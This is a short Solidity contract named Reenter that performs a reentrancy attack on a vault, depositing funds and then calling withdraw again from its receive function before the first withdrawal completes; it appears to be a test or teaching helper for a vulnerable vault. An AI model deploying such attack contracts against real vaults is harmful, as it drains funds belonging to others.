// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract Reenter {
    IVault public vault;
    bool public attacked;
    uint256 public amount;

    constructor(address vaultAddr) {
        vault = IVault(vaultAddr);
    }

    function depositToVault() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack(uint256 _amount) external {
        amount = _amount;
        attacked = false;
        vault.withdraw(_amount);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            vault.withdraw(amount);
        }
    }
}